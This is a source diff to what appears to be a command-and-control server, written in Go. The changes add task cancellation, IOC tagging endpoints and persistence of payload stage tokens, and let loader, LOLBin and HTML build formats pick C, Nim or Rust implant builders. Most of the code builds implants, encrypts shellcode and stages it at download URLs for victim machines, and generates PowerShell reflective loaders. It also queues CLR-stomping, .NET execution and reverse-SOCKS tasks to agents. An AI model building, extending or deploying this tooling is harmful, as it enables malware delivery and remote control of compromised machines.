@@ -24,6 +24,14 @@ import (
 	"unicode/utf16"
 )
 
+// shortID returns the first 8 characters of id for logging, or the full id if shorter.
+func shortID(id string) string {
+	if len(id) >= 8 {
+		return id[:8]
+	}
+	return id
+}
+
 // securityHeaders wraps a handler and injects baseline HTTP security headers
 // into every response. CSP is intentionally omitted — the GUI panel uses
 // inline scripts and would break.
@@ -48,6 +56,8 @@ func (s *Server) operatorMux() *http.ServeMux {
 	mux.HandleFunc("/api/chat", s.requireRole(RoleViewer, s.apiChat))
 	mux.HandleFunc("/api/operators", s.requireRole(RoleViewer, s.apiOperators))
 	mux.HandleFunc("/api/report", s.requireRole(RoleViewer, s.apiReport))
+	mux.HandleFunc("/api/iocs", s.requireRole(RoleViewer, s.apiIOCs))
+	mux.HandleFunc("/api/iocs/", s.requireRole(RoleOperator, s.apiIOCAction))
 	mux.HandleFunc("/api/attack-layer", s.requireRole(RoleViewer, s.apiAttackLayer))
 	mux.HandleFunc("/api/pubip", s.requireRole(RoleViewer, s.apiPubIP))
 	mux.HandleFunc("/api/creds", s.requireCredsRole)
@@ -130,7 +140,8 @@ func (s *Server) requireAgentDetailRole(w http.ResponseWriter, r *http.Request) 
 	path := strings.TrimPrefix(r.URL.Path, "/api/agents/")
 	parts := strings.Split(path, "/")
 	minRole := RoleViewer
-	if len(parts) >= 2 && parts[1] != "" && parts[1] != "results" && parts[1] != "tasks" {
+	taskDelete := len(parts) >= 3 && parts[1] == "tasks" && parts[2] != "" && r.Method == http.MethodDelete
+	if taskDelete || (len(parts) >= 2 && parts[1] != "" && parts[1] != "results" && parts[1] != "tasks") {
 		minRole = RoleOperator
 	}
 	s.requireRole(minRole, s.apiAgentDetail)(w, r)
@@ -317,7 +328,7 @@ func (s *Server) apiAgentDetail(w http.ResponseWriter, r *http.Request) {
 			jsonErr(w, err.Error(), http.StatusInternalServerError)
 			return
 		}
-		s.printf("[%s→%s] task #%d queued: %s %s\n", operator, agentID[:8], tid, req.Type, req.Args)
+		s.printf("[%s→%s] task #%d queued: %s %s\n", operator, shortID(agentID), tid, req.Type, req.Args)
 		// Update agent sleep in DB immediately so GUI reflects the new interval
 		if req.Type == "SLEEP" {
 			var sa struct {
@@ -355,6 +366,19 @@ func (s *Server) apiAgentDetail(w http.ResponseWriter, r *http.Request) {
 		jsonOK(w, results)
 
 	case "tasks":
+		if r.Method == http.MethodDelete && len(parts) >= 3 && parts[2] != "" {
+			taskID, err := strconv.ParseInt(parts[2], 10, 64)
+			if err != nil {
+				jsonErr(w, "invalid task id", http.StatusBadRequest)
+				return
+			}
+			if err := s.db.CancelTask(taskID, agentID); err != nil {
+				jsonErr(w, err.Error(), http.StatusBadRequest)
+				return
+			}
+			jsonOK(w, map[string]string{"status": "cancelled"})
+			return
+		}
 		limit := apiLimit(r)
 		tasks, err := s.db.RecentTasks(agentID, limit)
 		if err != nil {
@@ -389,7 +413,7 @@ func (s *Server) apiAgentDetail(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 		operator := operatorFromCert(r)
-		s.printf("[%s] deleted agent %s\n", operator, agentID[:8])
+		s.printf("[%s] deleted agent %s\n", operator, shortID(agentID))
 		jsonOK(w, map[string]string{"status": "deleted"})
 
 	case "clrstomp":
@@ -445,7 +469,7 @@ func (s *Server) apiAgentDetail(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 		s.printf("[%s→%s] task #%d queued: CLR_STOMP assembly=%s\n",
-			operator, agentID[:8], tid, req.Assembly)
+			operator, shortID(agentID), tid, req.Assembly)
 		jsonOK(w, map[string]int64{"task_id": tid})
 
 	case "dotnet_exec":
@@ -490,7 +514,7 @@ func (s *Server) apiAgentDetail(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 		s.printf("[%s→%s] task #%d queued: DOTNET_EXEC (%d bytes)\n",
-			operator, agentID[:8], tid, len(asmBytes))
+			operator, shortID(agentID), tid, len(asmBytes))
 		jsonOK(w, map[string]int64{"task_id": tid})
 
 	case "note":
@@ -817,6 +841,29 @@ func (s *Server) apiOperators(w http.ResponseWriter, r *http.Request) {
 
 // ── build + cert endpoints ────────────────────────────────────────────────
 
+// registerStage wraps RegisterStage and persists the token to the DB so it survives restarts.
+func (s *Server) registerStage(filePath, contentType string, maxDL int) (string, error) {
+	token, err := RegisterStage(filePath, contentType, maxDL)
+	if err != nil {
+		return "", err
+	}
+	s.db.SaveStage(token, filePath, contentType, maxDL)
+	return token, nil
+}
+
+// setStageURL wraps SetStageURL and persists the URL to the DB.
+func (s *Server) setStageURL(token, url string) {
+	SetStageURL(token, url)
+	s.db.UpdateStageURL(token, url)
+}
+
+// removeStage wraps RemoveStage and deletes from the DB.
+func (s *Server) removeStage(token string) bool {
+	ok := RemoveStage(token)
+	s.db.DeleteStage(token)
+	return ok
+}
+
 func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodPost {
 		jsonErr(w, "POST required", http.StatusMethodNotAllowed)
@@ -940,7 +987,13 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	if cfg.Lang == "c" {
+	// Loader formats (loader-c, loader-nim, loader, loader-go) need to reach the
+	// switch block below so they can select the right implant build per lang.
+	// Skip the lang-specific fast path for those formats.
+	isLoaderFmt := cfg.Format == "loader-c" || cfg.Format == "loader-nim" ||
+		cfg.Format == "loader" || cfg.Format == "loader-go"
+
+	if cfg.Lang == "c" && !isLoaderFmt {
 		if cfg.GOOS == "linux" {
 			elfPath, err := BuildCAgentLinux(cfg, payloadsDir)
 			if err != nil {
@@ -1015,7 +1068,18 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		}
 
 	case cfg.Format == "html":
-		exePath, err := BuildEXE(cfg, payloadsDir)
+		var exePath string
+		var err error
+		switch cfg.Lang {
+		case "c":
+			exePath, err = BuildCAgentEXE(cfg, payloadsDir)
+		case "nim":
+			exePath, err = BuildNimEXE(cfg, payloadsDir)
+		case "rust":
+			exePath, err = BuildRustEXE(cfg, payloadsDir)
+		default:
+			exePath, err = BuildEXE(cfg, payloadsDir)
+		}
 		if err != nil {
 			jsonErr(w, "build exe: "+err.Error(), http.StatusInternalServerError)
 			return
@@ -1036,7 +1100,18 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 			jsonErr(w, "stage-url required for format=loader", http.StatusBadRequest)
 			return
 		}
-		exePath, err := BuildEXE(cfg, payloadsDir)
+		var exePath string
+		var err error
+		switch cfg.Lang {
+		case "c":
+			exePath, err = BuildCAgentEXE(cfg, payloadsDir)
+		case "nim":
+			exePath, err = BuildNimEXE(cfg, payloadsDir)
+		case "rust":
+			exePath, err = BuildRustEXE(cfg, payloadsDir)
+		default:
+			exePath, err = BuildEXE(cfg, payloadsDir)
+		}
 		if err != nil {
 			jsonErr(w, "build exe: "+err.Error(), http.StatusInternalServerError)
 			return
@@ -1071,13 +1146,13 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		}
 		encFile.Close()
 		encBinPath := encFile.Name()
-		binToken, err := RegisterStage(encBinPath, "application/octet-stream", cfg.StageMaxDL)
+		binToken, err := s.registerStage(encBinPath, "application/octet-stream", cfg.StageMaxDL)
 		if err != nil {
 			jsonErr(w, "stage .bin: "+err.Error(), http.StatusInternalServerError)
 			return
 		}
 		binURL := cfg.StageURL + "/stage/" + binToken
-		SetStageURL(binToken, binURL)
+		s.setStageURL(binToken, binURL)
 		keyHex := fmt.Sprintf("%02x%02x%02x%02x", key[0], key[1], key[2], key[3])
 		op := operatorFromCert(r)
 		s.printf("[%s] loader shellcode: raw=%dKB → compressed=%dKB (%.0f%%)\n",
@@ -1101,19 +1176,30 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 			jsonErr(w, "stage-url required for format=lolbin", http.StatusBadRequest)
 			return
 		}
-		exePath, err := BuildEXE(cfg, payloadsDir)
+		var exePath string
+		var err error
+		switch cfg.Lang {
+		case "c":
+			exePath, err = BuildCAgentEXE(cfg, payloadsDir)
+		case "nim":
+			exePath, err = BuildNimEXE(cfg, payloadsDir)
+		case "rust":
+			exePath, err = BuildRustEXE(cfg, payloadsDir)
+		default:
+			exePath, err = BuildEXE(cfg, payloadsDir)
+		}
 		if err != nil {
 			jsonErr(w, "build exe: "+err.Error(), http.StatusInternalServerError)
 			return
 		}
 		// Stage the raw EXE (LOLBins download and execute it directly)
-		exeToken, err := RegisterStage(exePath, "application/octet-stream", cfg.StageMaxDL)
+		exeToken, err := s.registerStage(exePath, "application/octet-stream", cfg.StageMaxDL)
 		if err != nil {
 			jsonErr(w, "stage exe: "+err.Error(), http.StatusInternalServerError)
 			return
 		}
 		exeURL := cfg.StageURL + "/stage/" + exeToken
-		SetStageURL(exeToken, exeURL)
+		s.setStageURL(exeToken, exeURL)
 		result["exe_stage"] = exeURL
 
 		op := operatorFromCert(r)
@@ -1135,7 +1221,19 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 			jsonErr(w, "stage-url required for format=loader-c", http.StatusBadRequest)
 			return
 		}
-		exePath, err := BuildEXE(cfg, payloadsDir)
+		// Select implant build function based on requested agent language.
+		var exePath string
+		var err error
+		switch cfg.Lang {
+		case "c":
+			exePath, err = BuildCAgentEXE(cfg, payloadsDir)
+		case "nim":
+			exePath, err = BuildNimEXE(cfg, payloadsDir)
+		case "rust":
+			exePath, err = BuildRustEXE(cfg, payloadsDir)
+		default: // "go" or ""
+			exePath, err = BuildEXE(cfg, payloadsDir)
+		}
 		if err != nil {
 			jsonErr(w, "build exe: "+err.Error(), http.StatusInternalServerError)
 			return
@@ -1166,13 +1264,13 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		}
 		encFile.Close()
 		encBinPath := encFile.Name()
-		binToken, err := RegisterStage(encBinPath, "application/octet-stream", cfg.StageMaxDL)
+		binToken, err := s.registerStage(encBinPath, "application/octet-stream", cfg.StageMaxDL)
 		if err != nil {
 			jsonErr(w, "stage .bin: "+err.Error(), http.StatusInternalServerError)
 			return
 		}
 		binURL := cfg.StageURL + "/stage/" + binToken
-		SetStageURL(binToken, binURL)
+		s.setStageURL(binToken, binURL)
 		keyHex := fmt.Sprintf("%02x%02x%02x%02x", key[0], key[1], key[2], key[3])
 		op := operatorFromCert(r)
 		s.printf("[%s] loader-c shellcode: raw=%dKB (no compression)\n",
@@ -1195,7 +1293,18 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 			jsonErr(w, "stage-url required for format=loader-nim", http.StatusBadRequest)
 			return
 		}
-		exePath, err := BuildEXE(cfg, payloadsDir)
+		var exePath string
+		var err error
+		switch cfg.Lang {
+		case "c":
+			exePath, err = BuildCAgentEXE(cfg, payloadsDir)
+		case "nim":
+			exePath, err = BuildNimEXE(cfg, payloadsDir)
+		case "rust":
+			exePath, err = BuildRustEXE(cfg, payloadsDir)
+		default:
+			exePath, err = BuildEXE(cfg, payloadsDir)
+		}
 		if err != nil {
 			jsonErr(w, "build exe: "+err.Error(), http.StatusInternalServerError)
 			return
@@ -1226,13 +1335,13 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		}
 		encFile.Close()
 		encBinPath := encFile.Name()
-		binToken, err := RegisterStage(encBinPath, "application/octet-stream", cfg.StageMaxDL)
+		binToken, err := s.registerStage(encBinPath, "application/octet-stream", cfg.StageMaxDL)
 		if err != nil {
 			jsonErr(w, "stage .bin: "+err.Error(), http.StatusInternalServerError)
 			return
 		}
 		binURL := cfg.StageURL + "/stage/" + binToken
-		SetStageURL(binToken, binURL)
+		s.setStageURL(binToken, binURL)
 		keyHex := fmt.Sprintf("%02x%02x%02x%02x", key[0], key[1], key[2], key[3])
 		op := operatorFromCert(r)
 		s.printf("[%s] loader-nim shellcode: raw=%dKB (no compression)\n",
@@ -1301,25 +1410,25 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		encFile.Close()
 		encBinPath := encFile.Name()
 
-		binToken, err := RegisterStage(encBinPath, "application/octet-stream", cfg.StageMaxDL)
+		binToken, err := s.registerStage(encBinPath, "application/octet-stream", cfg.StageMaxDL)
 		if err != nil {
 			jsonErr(w, "stage .bin: "+err.Error(), http.StatusInternalServerError)
 			return
 		}
 		binURL := cfg.StageURL + "/stage/" + binToken
-		SetStageURL(binToken, binURL)
+		s.setStageURL(binToken, binURL)
 
 		// Prefer pre-compiled runner DLL (no Add-Type temp file on victim).
 		// Falls back to Add-Type PS loader when no C# compiler is available.
 		var ps string
 		if runnerDLL, err := buildRunnerDLL(payloadsDir); err == nil && runnerDLL != "" {
-			runnerToken, err := RegisterStage(runnerDLL, "application/octet-stream", cfg.StageMaxDL)
+			runnerToken, err := s.registerStage(runnerDLL, "application/octet-stream", cfg.StageMaxDL)
 			if err != nil {
 				jsonErr(w, "stage runner.dll: "+err.Error(), http.StatusInternalServerError)
 				return
 			}
 			runnerURL := cfg.StageURL + "/stage/" + runnerToken
-			SetStageURL(runnerToken, runnerURL)
+			s.setStageURL(runnerToken, runnerURL)
 			ps = psReflectiveLoader(runnerURL, binURL, key)
 			result["runner_stage"] = runnerURL
 		} else {
@@ -1488,7 +1597,7 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		}
 		encFile.Close()
 		encBinPath := encFile.Name()
-		binToken, err := RegisterStage(encBinPath, "application/octet-stream", cfg.StageMaxDL)
+		binToken, err := s.registerStage(encBinPath, "application/octet-stream", cfg.StageMaxDL)
 		if err != nil {
 			jsonErr(w, "stage srdi bin: "+err.Error(), http.StatusInternalServerError)
 			return
@@ -1498,7 +1607,7 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 			stageBase = cfg.ServerURL
 		}
 		binURL := stageBase + "/stage/" + binToken
-		SetStageURL(binToken, binURL)
+		s.setStageURL(binToken, binURL)
 		keyHex := fmt.Sprintf("%02x%02x%02x%02x", key[0], key[1], key[2], key[3])
 		op := operatorFromCert(r)
 		s.printf("[%s] sRDI shellcode: %dKB → staged %s\n", op, len(rawBin)/1024, binURL)
@@ -1691,6 +1800,80 @@ func (s *Server) apiReport(w http.ResponseWriter, r *http.Request) {
 	jsonOK(w, data)
 }
 
+// ── IOC tagging ───────────────────────────────────────────────────────────
+
+func (s *Server) apiIOCs(w http.ResponseWriter, r *http.Request) {
+	switch r.Method {
+	case http.MethodGet:
+		taskIDStr := r.URL.Query().Get("task_id")
+		if taskIDStr != "" {
+			taskID, err := strconv.ParseInt(taskIDStr, 10, 64)
+			if err != nil {
+				jsonErr(w, "invalid task_id", http.StatusBadRequest)
+				return
+			}
+			iocs, err := s.db.GetTaskIOCs(taskID)
+			if err != nil {
+				jsonErr(w, err.Error(), http.StatusInternalServerError)
+				return
+			}
+			jsonOK(w, iocs)
+		} else {
+			iocs, err := s.db.ListAllIOCs()
+			if err != nil {
+				jsonErr(w, err.Error(), http.StatusInternalServerError)
+				return
+			}
+			jsonOK(w, iocs)
+		}
+	case http.MethodPost:
+		var req struct {
+			TaskID   int64  `json:"task_id"`
+			IOCType  string `json:"ioc_type"`
+			IOCValue string `json:"ioc_value"`
+			Note     string `json:"note"`
+		}
+		if err := jsonBody(r, &req); err != nil {
+			jsonErr(w, err.Error(), http.StatusBadRequest)
+			return
+		}
+		if req.IOCValue == "" {
+			jsonErr(w, "ioc_value required", http.StatusBadRequest)
+			return
+		}
+		if req.IOCType == "" {
+			req.IOCType = "ip"
+		}
+		op := operatorFromCert(r)
+		id, err := s.db.AddTaskIOC(req.TaskID, req.IOCType, req.IOCValue, req.Note, op)
+		if err != nil {
+			jsonErr(w, err.Error(), http.StatusInternalServerError)
+			return
+		}
+		jsonOK(w, map[string]int64{"id": id})
+	default:
+		jsonErr(w, "GET or POST required", http.StatusMethodNotAllowed)
+	}
+}
+
+func (s *Server) apiIOCAction(w http.ResponseWriter, r *http.Request) {
+	idStr := strings.TrimPrefix(r.URL.Path, "/api/iocs/")
+	id, err := strconv.ParseInt(idStr, 10, 64)
+	if err != nil {
+		jsonErr(w, "invalid id", http.StatusBadRequest)
+		return
+	}
+	if r.Method != http.MethodDelete {
+		jsonErr(w, "DELETE required", http.StatusMethodNotAllowed)
+		return
+	}
+	if err := s.db.DeleteTaskIOC(id); err != nil {
+		jsonErr(w, err.Error(), http.StatusInternalServerError)
+		return
+	}
+	jsonOK(w, map[string]string{"status": "deleted"})
+}
+
 // ── credential vault ──────────────────────────────────────────────────────
 
 func (s *Server) apiCreds(w http.ResponseWriter, r *http.Request) {
@@ -1861,7 +2044,7 @@ func (s *Server) apiRSocks(w http.ResponseWriter, r *http.Request) {
 		op := operatorFromCert(r)
 		s.db.QueueTask(req.AgentID, "RSOCKS_START", strconv.Itoa(callbackPort), nil, op)
 		s.printf("[%s] rsocks: agent=%s socks=:%d callback=:%d\n",
-			op, req.AgentID[:8], req.SocksPort, callbackPort)
+			op, shortID(req.AgentID), req.SocksPort, callbackPort)
 		resp := map[string]interface{}{
 			"socks_port":    req.SocksPort,
 			"callback_port": callbackPort,
@@ -1998,7 +2181,7 @@ func (s *Server) apiSRDI(w http.ResponseWriter, r *http.Request) {
 			jsonErr(w, "write enc: "+err.Error(), http.StatusInternalServerError)
 			return
 		}
-		token, err := RegisterStage(encPath, "application/octet-stream", 0)
+		token, err := s.registerStage(encPath, "application/octet-stream", 0)
 		if err != nil {
 			jsonErr(w, "stage: "+err.Error(), http.StatusInternalServerError)
 			return
@@ -2343,7 +2526,7 @@ func (s *Server) apiDeliver(w http.ResponseWriter, r *http.Request) {
 	encFile.Close()
 	encBinPath := encFile.Name()
 
-	binToken, err := RegisterStage(encBinPath, "application/octet-stream", cfg.StageMaxDL)
+	binToken, err := s.registerStage(encBinPath, "application/octet-stream", cfg.StageMaxDL)
 	if err != nil {
 		jsonErr(w, "stage .bin: "+err.Error(), http.StatusInternalServerError)
 		return
@@ -2354,7 +2537,7 @@ func (s *Server) apiDeliver(w http.ResponseWriter, r *http.Request) {
 	// Build PS loader (reflective DLL preferred, Add-Type fallback)
 	var ps string
 	if runnerDLL, err := buildRunnerDLL(payloadsDir); err == nil && runnerDLL != "" {
-		runnerToken, err := RegisterStage(runnerDLL, "application/octet-stream", cfg.StageMaxDL)
+		runnerToken, err := s.registerStage(runnerDLL, "application/octet-stream", cfg.StageMaxDL)
 		if err != nil {
 			jsonErr(w, "stage runner.dll: "+err.Error(), http.StatusInternalServerError)
 			return
